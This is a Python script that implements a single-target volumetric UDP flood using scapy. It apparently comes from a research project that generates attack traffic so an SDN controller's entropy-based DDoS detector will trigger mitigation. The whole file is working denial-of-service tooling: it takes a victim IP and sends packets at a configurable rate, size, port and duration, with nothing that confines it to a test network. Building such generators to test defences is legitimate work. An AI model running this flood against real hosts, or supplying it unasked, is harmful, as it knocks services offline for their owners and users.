"""Single-target volumetric UDP flood.

Companion to benign_traffic.py and random_dst_flood.py:

- benign_traffic.py        many sources, many destinations  -> high entropy (baseline)
- udp_flood.py             one source, one destination      -> dst-IP entropy collapses
- random_dst_flood.py      one source, many destinations    -> dst-IP entropy stays high

This is the classic L3/L4 volumetric DDoS: a steady UDP stream toward a fixed
victim. Used to drive destination-IP entropy below threshold so the controller
installs mitigation.
"""

from __future__ import annotations

import argparse
import logging
import sys
import time
from multiprocessing import Process

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import IP, UDP, Ether, sendp  # noqa: E402

from ddos_sdn.utils.network import resolve_interface  # noqa: E402

DEFAULT_DURATION = 10
DEFAULT_RATE = 100
DEFAULT_PACKET_SIZE = 1024
DEFAULT_DPORT = 80
DEFAULT_SPORT = 2

# L2 + IP + UDP header overhead. Anything sent here is `packet_size` total on the wire,
# so the payload is packet_size - HEADER_OVERHEAD bytes of fill.
HEADER_OVERHEAD = 42


def launch_attack(
    target_ip: str,
    duration: int,
    rate: int,
    packet_size: int,
    dport: int,
    interface: str | None,
) -> int:
    payload_len = max(0, packet_size - HEADER_OVERHEAD)
    payload = "X" * payload_len
    pkt = Ether() / IP(dst=target_ip) / UDP(sport=DEFAULT_SPORT, dport=dport) / payload
    inter_packet_delay = 1.0 / rate
    iface = resolve_interface(interface)

    end_time = time.time() + duration
    sent = 0
    while time.time() < end_time:
        if iface is not None:
            sendp(pkt, iface=iface, verbose=0)
        else:
            sendp(pkt, verbose=0)
        sent += 1
        time.sleep(inter_packet_delay)
    return sent


def parse_args(argv: list[str]) -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Single-target volumetric UDP flood. Sends a fixed packet "
                    "repeatedly to one destination for a bounded duration.",
    )
    parser.add_argument(
        "target_ip",
        help="victim IP address (e.g. 10.0.0.64)",
    )
    parser.add_argument(
        "--duration", type=int, default=DEFAULT_DURATION,
        help=f"flood duration in seconds (default: {DEFAULT_DURATION})",
    )
    parser.add_argument(
        "--rate", type=int, default=DEFAULT_RATE,
        help=f"packets per second (default: {DEFAULT_RATE})",
    )
    parser.add_argument(
        "--packet-size", type=int, default=DEFAULT_PACKET_SIZE,
        help=f"packet size in bytes including L2/L3/L4 headers (default: {DEFAULT_PACKET_SIZE})",
    )
    parser.add_argument(
        "--dport", type=int, default=DEFAULT_DPORT,
        help=f"destination UDP port (default: {DEFAULT_DPORT})",
    )
    parser.add_argument(
        "--interface", default=None,
        help="network interface to send packets on (default: auto-select via psutil)",
    )
    args = parser.parse_args(argv)
    if args.duration <= 0:
        parser.error("--duration must be > 0")
    if args.rate <= 0:
        parser.error("--rate must be > 0")
    if args.packet_size < HEADER_OVERHEAD:
        parser.error(f"--packet-size must be >= {HEADER_OVERHEAD} (L2+L3+L4 header overhead)")
    if not (0 <= args.dport <= 65535):
        parser.error("--dport must be in [0, 65535]")
    return args


def main(argv: list[str] | None = None) -> None:
    args = parse_args(argv if argv is not None else sys.argv[1:])
    print(
        f"udp_flood: target={args.target_ip} duration={args.duration}s "
        f"rate={args.rate}pps size={args.packet_size}B dport={args.dport}"
    )
    proc = Process(
        target=launch_attack,
        args=(args.target_ip, args.duration, args.rate, args.packet_size, args.dport, args.interface),
    )
    proc.start()
    try:
        proc.join()
    except KeyboardInterrupt:
        print("udp_flood: interrupted", file=sys.stderr)
        proc.terminate()
        proc.join()
        sys.exit(130)
    print(f"udp_flood: completed (target={args.target_ip})")


if __name__ == "__main__":
    main()
